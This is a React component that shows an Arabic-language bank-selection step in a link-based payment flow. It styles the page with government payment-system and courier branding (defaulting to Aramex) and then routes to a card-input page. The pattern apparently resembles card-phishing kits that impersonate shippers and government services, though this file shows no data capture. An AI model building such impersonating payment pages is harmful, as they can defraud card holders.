import { useState, useEffect } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { useLink, useUpdateLink } from "@/hooks/useSupabase";
import { Building2, ArrowLeft, Loader2 } from "lucide-react";
import { useToast } from "@/hooks/use-toast";
import { getServiceBranding } from "@/lib/serviceLogos";
import { getGovernmentPaymentSystem } from "@/lib/governmentPaymentSystems";
import { getCountryByCode } from "@/lib/countries";
import { getBanksByCountry, Bank } from "@/lib/banks";
import { formatCurrency } from "@/lib/countryCurrencies";

const PaymentBankSelector = () => {
  const { id } = useParams();
  const navigate = useNavigate();
  const { toast } = useToast();
  const { data: linkData, isLoading: linkLoading } = useLink(id);
  const updateLink = useUpdateLink();

  const [selectedBank, setSelectedBank] = useState<string>("");
  const [banks, setBanks] = useState<Bank[]>([]);
  const [loadingBanks, setLoadingBanks] = useState(false);
  
  // Get country from link data
  const countryCode = linkData?.payload?.selectedCountry || linkData?.country_code || "SA";
  const countryData = getCountryByCode(countryCode);
  
  // Get government payment system
  const govSystem = getGovernmentPaymentSystem(countryCode);
  
  // Get preselected bank from link payload if available
  const preselectedBank = linkData?.payload?.selected_bank;
  
  // Get customer info from link data (cross-device compatible)
  const customerInfo = linkData?.payload?.customerInfo || {};
  const serviceKey = linkData?.payload?.service_key || customerInfo.service || 'aramex';
  const serviceName = linkData?.payload?.service_name || serviceKey;
  const branding = getServiceBranding(serviceKey);
  
  const shippingInfo = linkData?.payload as any;
  const paymentData = shippingInfo?.payment_data;

  // Get amount from link data - prioritize payment_data amount, then payment_amount, then cod_amount
  const rawAmount = paymentData?.payment_amount || shippingInfo?.payment_amount || shippingInfo?.cod_amount;

  // Handle different data types and edge cases
  let amount = 500; // Default value
  if (rawAmount !== undefined && rawAmount !== null) {
    if (typeof rawAmount === 'number') {
      amount = rawAmount;
    } else if (typeof rawAmount === 'string') {
      const parsed = parseFloat(rawAmount);
      if (!isNaN(parsed)) {
        amount = parsed;
      }
    }
  }

  // Get saved currency code from payment_data or shipping info
  const currencyCode = paymentData?.currency_code || shippingInfo?.currency_code || countryData?.currency || "SAR";
  const formattedAmount = formatCurrency(amount, currencyCode);
  
  // Load banks when country is available from link data
  useEffect(() => {
    if (countryCode) {
      setLoadingBanks(true);
      // Simulate API call
      setTimeout(() => {
        const countryBanks = getBanksByCountry(countryCode);
        setBanks(countryBanks);
        setLoadingBanks(false);
        
        // Auto-select bank if it was preselected during link creation
        if (preselectedBank) {
          setSelectedBank(preselectedBank);
        }
      }, 300);
    }
  }, [countryCode, preselectedBank]);
  
  const handleBankSelect = (bankId: string) => {
    setSelectedBank(bankId);
  };
  
  const handleSkip = async () => {
    if (!linkData) return;

    // Save to link for cross-device compatibility
    try {
      const updatedPayload = {
        ...linkData.payload,
        selectedCountry: countryCode,
        selectedBank: 'skipped',
      };

      await updateLink.mutateAsync({
        linkId: id!,
        payload: updatedPayload
      });
    } catch (error) {
      // Error saving bank selection
    }

    toast({
      title: "تم التخطي",
      description: "يمكنك إدخال بيانات البطاقة من أي بنك",
    });

    navigate(`/pay/${id}/card-input`);
  };

  const handleContinue = async () => {
    if (!linkData || !selectedBank) return;

    // Save to link for cross-device compatibility
    try {
      const updatedPayload = {
        ...linkData.payload,
        selectedCountry: countryCode,
        selectedBank: selectedBank,
      };

      await updateLink.mutateAsync({
        linkId: id!,
        payload: updatedPayload
      });
    } catch (error) {
      // Error saving bank selection
    }

    navigate(`/pay/${id}/card-input`);
  };
  
  // Show loading state while fetching link data
  if (linkLoading || !linkData) {
    return (
      <div 
        className="min-h-screen py-4 sm:py-12 flex items-center justify-center bg-background" 
        dir="rtl"
        style={{
          background: govSystem.colors.surface
        }}
      >
        <div className="text-center">
          <Loader2 className="w-12 h-12 animate-spin mx-auto mb-4" style={{ color: govSystem.colors.primary }} />
          <p style={{ color: govSystem.colors.textLight, fontFamily: govSystem.fonts.primaryAr }}>جاري تحميل البيانات...</p>
        </div>
      </div>
    );
  }
  
  // Show error if no country data
  if (!countryData) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-background" dir="rtl">
        <div className="text-center p-8">
          <Building2 className="w-16 h-16 mx-auto mb-4 text-muted-foreground" />
          <h2 className="text-2xl font-bold mb-2 text-foreground">خطأ في البيانات</h2>
          <p className="text-muted-foreground mb-6">لم يتم العثور على بيانات الدولة</p>
          <Button onClick={() => navigate('/services')}>العودة للخدمات</Button>
        </div>
      </div>
    );
  }
  
  return (
    <div 
      className="min-h-screen py-4 sm:py-12 bg-background" 
      dir="rtl"
      style={{
        background: govSystem.colors.surface
      }}
    >
      <div className="container mx-auto px-4 max-w-2xl">
        {/* Header */}
        <div className="mb-6">
          <button
            onClick={() => navigate(`/pay/${id}/details`)}
            className="flex items-center gap-2 text-sm mb-4"
            style={{ color: govSystem.colors.textLight }}
          >
            <ArrowLeft className="w-4 h-4" />
            <span>رجوع</span>
          </button>
          
          <div className="flex items-center gap-3 mb-2">
            <div
              className="w-12 h-12 rounded-full flex items-center justify-center"
              style={{
                background: govSystem.gradients.primary,
              }}
            >
              <Building2 className="w-6 h-6 text-white" />
            </div>
            <div>
              <h1 className="text-2xl font-bold" style={{ color: govSystem.colors.text, fontFamily: govSystem.fonts.primaryAr }}>اختر البنك</h1>
              <p className="text-sm" style={{ color: govSystem.colors.textLight, fontFamily: govSystem.fonts.primaryAr }}>
                {govSystem.nameAr} - {formattedAmount}
              </p>
            </div>
          </div>
        </div>

        {/* Country Badge */}
        {countryData && (
          <div className="mb-4">
            <Badge 
              className="text-sm px-3 py-1.5"
              style={{ 
                background: govSystem.gradients.primary,
                color: govSystem.colors.textOnPrimary,
                fontFamily: govSystem.fonts.primaryAr
              }}
            >
              {countryData.flag} {countryData.nameAr} - {govSystem.nameAr}
            </Badge>
          </div>
        )}

        {/* Loading Banks */}
        {loadingBanks ? (
          <div className="text-center py-12">
            <Loader2 className="w-8 h-8 animate-spin mx-auto mb-4" style={{ color: govSystem.colors.primary }} />
            <p style={{ color: govSystem.colors.textLight, fontFamily: govSystem.fonts.primaryAr }}>جاري تحميل البنوك...</p>
          </div>
        ) : banks.length === 0 ? (
          <Card className="p-8 text-center" style={{ borderRadius: govSystem.borderRadius.lg }}>
            <Building2 className="w-12 h-12 mx-auto mb-4" style={{ color: govSystem.colors.textLight }} />
            <p className="mb-4" style={{ color: govSystem.colors.textLight, fontFamily: govSystem.fonts.primaryAr }}>لا توجد بنوك متاحة لهذه الدولة</p>
            <Button 
              onClick={handleSkip} 
              variant="outline"
              style={{ 
                borderColor: govSystem.colors.primary,
                color: govSystem.colors.primary,
                fontFamily: govSystem.fonts.primaryAr
              }}
            >
              متابعة بدون تحديد بنك
            </Button>
          </Card>
        ) : (
          <>
            {/* Banks Grid */}
            <div className="grid grid-cols-1 sm:grid-cols-2 gap-3 mb-6">
              {banks.map((bank) => (
                <Card
                  key={bank.id}
                  className={`p-4 cursor-pointer transition-all hover:shadow-md ${
                    selectedBank === bank.id
                      ? 'ring-2'
                      : 'hover:bg-accent/50'
                  }`}
                  style={{
                    borderColor: selectedBank === bank.id ? govSystem.colors.primary : govSystem.colors.border,
                    backgroundColor: selectedBank === bank.id ? `${govSystem.colors.primary}05` : undefined,
                    borderRadius: govSystem.borderRadius.md,
                    borderWidth: selectedBank === bank.id ? '2px' : '1px'
                  }}
                  onClick={() => handleBankSelect(bank.id)}
                >
                  <div className="flex items-center gap-3">
                    <div
                      className="w-10 h-10 rounded-lg flex items-center justify-center text-white text-sm font-bold"
                      style={{
                        background: selectedBank === bank.id
                          ? govSystem.gradients.primary
                          : '#64748b',
                        fontFamily: govSystem.fonts.primaryAr
                      }}
                    >
                      {bank.nameAr.charAt(0)}
                    </div>
                    <div className="flex-1">
                      <h3 className="font-semibold text-sm" style={{ fontFamily: govSystem.fonts.primaryAr, color: govSystem.colors.text }}>{bank.nameAr}</h3>
                      <p className="text-xs" style={{ color: govSystem.colors.textLight }}>{bank.name}</p>
                    </div>
                    {selectedBank === bank.id && (
                      <div
                        className="w-5 h-5 rounded-full flex items-center justify-center"
                        style={{ backgroundColor: govSystem.colors.primary }}
                      >
                        <svg
                          className="w-3 h-3 text-white"
                          fill="none"
                          strokeLinecap="round"
                          strokeLinejoin="round"
                          strokeWidth="2"
                          viewBox="0 0 24 24"
                          stroke="currentColor"
                        >
                          <path d="M5 13l4 4L19 7" />
                        </svg>
                      </div>
                    )}
                  </div>
                </Card>
              ))}
            </div>

            {/* Action Buttons */}
            <div className="space-y-3">
              <Button
                onClick={handleContinue}
                disabled={!selectedBank}
                className="w-full h-12 text-base font-semibold"
                style={{
                  background: selectedBank
                    ? `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`
                    : undefined,
                }}
              >
                متابعة
              </Button>
              
              <Button
                onClick={handleSkip}
                variant="outline"
                className="w-full h-12 text-base"
              >
                تخطي واستخدام أي بنك
              </Button>
            </div>

            {/* Info Note */}
            <div className="mt-6 p-4 bg-muted/50 rounded-lg">
              <p className="text-xs text-muted-foreground text-center">
                💡 يمكنك تخطي هذه الخطوة واستخدام بطاقة من أي بنك
              </p>
            </div>
          </>
        )}
      </div>
    </div>
  );
};

export default PaymentBankSelector;
